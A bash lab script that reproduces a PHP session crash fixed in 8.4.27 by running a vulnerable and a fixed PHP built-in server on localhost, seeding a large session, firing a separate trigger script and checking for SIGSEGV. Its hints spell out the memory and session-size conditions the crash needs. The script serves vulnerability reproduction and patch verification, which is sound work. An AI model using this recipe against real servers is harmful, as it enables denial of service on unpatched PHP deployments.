#!/usr/bin/env bash
# 30-second differential: no ASAN build required.
#
# Give it two PHP CLIs: one older than 8.4.27 (vulnerable) and one 8.4.27+
# (fixed). It seeds a session, fires the two-request trigger, and checks
# whether the server process survives. The vulnerable one dies with SIGSEGV.
#
#   PHP_VULN=/usr/bin/php PHP_FIXED=/opt/php-8.4.27/bin/php lab/quickstart.sh
#
# Everything binds to 127.0.0.1. Lab use only.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
VULN="${PHP_VULN:-php}"
FIXED="${PHP_FIXED:-}"
PY="${PYTHON:-python3}"
MEMLIMIT="${MEMLIMIT:-8M}"
SESSBYTES="${SESSBYTES:-6000000}"
WWW="$ROOT/lab/www"
BASE_PORT="${PORT:-19200}"

if [ -z "$FIXED" ]; then
  echo "usage: PHP_VULN=/path/php-vuln PHP_FIXED=/path/php-8.4.27+ lab/quickstart.sh"
  echo "  PHP_VULN  default: php on PATH (must be < 8.4.27)"
  exit 2
fi
for b in "$VULN" "$FIXED"; do
  [ -x "$b" ] || command -v "$b" >/dev/null || { echo "[!] not executable: $b"; exit 2; }
done

# run_one <label> <php> <port>  -> echoes "alive" or "dead"
run_one() {
  local label="$1" bin="$2" port="$3"
  local dir="$ROOT/.sessions/$label"
  local sid="quick${label}$(date +%s | cut -c7-10)"
  local log="$ROOT/evidence/quickstart-$label.log"
  mkdir -p "$dir" "$(dirname "$log")"
  "$PY" "$ROOT/tools/seed_session.py" "$sid" "$SESSBYTES" "$dir" >/dev/null

  "$bin" -d memory_limit="$MEMLIMIT" -d session.save_path="$dir" \
         -S "127.0.0.1:$port" -t "$WWW" >"$log" 2>&1 &
  local pid=$!
  for _ in $(seq 1 40); do
    sleep 0.25
    curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$port/index.php" && break
  done

  echo "── $label: $("$bin" -v | head -1) ──"
  "$PY" "$ROOT/tools/trigger.py" 127.0.0.1 "$port" "$sid" "probe${label}${port}" 2>&1 | sed 's/^/   /'
  sleep 1
  if kill -0 "$pid" 2>/dev/null; then
    echo "   server: ALIVE"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    echo alive > "$STATUS_FILE"
  else
    wait "$pid" 2>/dev/null
    local rc=$?
    echo "   server: DEAD (exit $rc$([ "$rc" -eq 139 ] && echo ', SIGSEGV'))"
    echo dead > "$STATUS_FILE"
  fi
}

STATUS_FILE="$(mktemp)"
run_one vulnerable "$VULN" "$BASE_PORT"
A=$(cat "$STATUS_FILE")
run_one fixed "$FIXED" "$((BASE_PORT + 1))"
B=$(cat "$STATUS_FILE")
rm -f "$STATUS_FILE"

echo
echo "=============== VERDICT ==============="
echo "vulnerable build: $A"
echo "fixed build     : $B"
if [ "$A" = "dead" ] && [ "$B" = "alive" ]; then
  echo "RESULT: reproduced (vulnerable dies, fixed survives)"
  exit 0
fi
echo "RESULT: not reproduced"
echo "  hints: memory_limit must sit between 'decode fits' and 'encode fails'"
echo "         (defaults 8M limit / 6MB session); the SAPI must keep the"
echo "         process alive (CLI server or prefork mod_php, not php-fpm)"
exit 1
